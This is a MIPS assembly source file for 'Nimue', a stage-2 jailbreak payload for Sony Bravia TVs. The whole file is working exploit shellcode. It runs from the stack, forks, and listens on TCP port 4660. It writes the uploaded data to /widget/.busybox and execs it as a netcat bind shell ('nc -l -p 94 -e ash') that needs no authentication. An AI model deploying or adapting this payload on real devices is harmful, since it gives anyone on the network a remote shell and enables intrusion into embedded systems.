# Nimue jailbreaking script for Sony Bravia TVs.
# Copyright (C) 2012 Sam Edwards
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

#include <asm/unistd.h>
#include <asm/regdef.h>

.set noreorder
.section .text
.globl __start
__start:

# This code lives on the stack, so move sp out of the way to make sure it
# doesn't end up getting clobbered.
addiu sp, -0x500

# Establish a way of doing position-independent data load.
bal relative_to
nop
relative_to:
move s6, ra
#define LOAD_ADDRESS(register, label) \
	addiu register, s6, (label-relative_to)

######################################
### SET UP COMPLETE - BEGIN STAGE2 ###
######################################

# First, fork into the background.
# The parent will either attempt to fix the stack and reenter the console loop,
# or simply enter an infinite sleep loop, depending on whether or not
# ATTMEPT_STACK_REPAIR is defined.
# The child will continue with stage2, and download&execute busybox.

li v0, __NR_fork
syscall
beq v0, zero, is_child
nop

# PARENT - safely exit stage2

#ifdef ATTEMPT_STACK_REPAIR
# Try to load back registers s*/gp/ra and return to the console command loop.
addiu sp, 0x528
lw s6, 0x30(sp)
lw s5, 0x2C(sp)
lw s4, 0x28(sp)
lw s3, 0x24(sp)
lw s2, 0x20(sp)
addiu sp, 0x1260
lw gp, 0x10(sp)
lw ra, 0x0538(sp)
lw s1, 0x0534(sp)
lw s0, 0x0530(sp)
jr ra
addiu sp, 0x0540
#else
# Sit here and wait until the end of days.
infinite_sleep_loop:
LOAD_ADDRESS(a0, timespec_10sec)
li v0, __NR_nanosleep
syscall
b infinite_sleep_loop
nop
#endif

is_child:
# CHILD - continue to download/execute busybox

# Create & bind TCP socket...
li a0, 2
move a1, a0
move a2, zero
li v0, __NR_socket
syscall
beq v0, zero, child_exit
move s0, v0

move a0, s0
LOAD_ADDRESS(a1, socket_sockaddr)
li a2, 16
li v0, __NR_bind
syscall
bne v0, zero, child_exit

# Begin listening...
move a0, s0
li a1, 1
li v0, __NR_listen
syscall
bne v0, zero, child_exit

# Accept the first connection...
move a0, s0
move a1, zero
move a2, zero
li v0, __NR_accept
syscall
beq v0, zero, child_exit
move s1, v0

# Open the output file...
LOAD_ADDRESS(a0, busybox_filename)
li a1, 0x0101 # O_WRONLY|O_CREAT
li a2, 0755
li v0, __NR_open
syscall
beq v0, zero, child_exit
move s2, v0

# Download the file...
addiu sp, -0x100

download_loop:
move a0, s1
move a1, sp
li a2, 0x100
li v0, __NR_read
syscall
beq v0, zero, exit_download_loop # Exit loop if socket closed...
move a0, s2
move a1, sp
move a2, v0
li v0, __NR_write
syscall
b download_loop
exit_download_loop:

# Close down everything...
#move a0, s2 # Not needed... This is in the branch-delay slot above.
li v0, __NR_close
syscall
move a0, s1
li v0, __NR_close
syscall
move a0, s0
li v0, __NR_close
syscall

# Exec busybox!
LOAD_ADDRESS(a0, busybox_filename)
move a1, sp
LOAD_ADDRESS(t0, busybox_applet)
addiu t1, t0, 18
busybox_arg_loop:
sw t0, 0(sp)
addiu t0, 3
subu t2, t1, t0
bgtz t2, busybox_arg_loop
addiu sp, 4
sw zero, 0(sp)
move a2, zero
li v0, __NR_execve
syscall

child_exit:
li a0, 42
li v0, __NR_exit
syscall
# Returned from exit??? Sleep and try again...
LOAD_ADDRESS(a0, timespec_10sec)
li v0, __NR_nanosleep
syscall
b child_exit
nop

busybox_filename:
.asciz "/widget/.busybox"
busybox_applet:
.asciz "nc", "-l", "-p", "94", "-e", "ash"
socket_sockaddr:
.hword 2
.byte 0x12, 0x34 # Port 0x1234 (4660)
.int 0
.int 0, 0
timespec_10sec:
.int 10
.int 0
.long 0
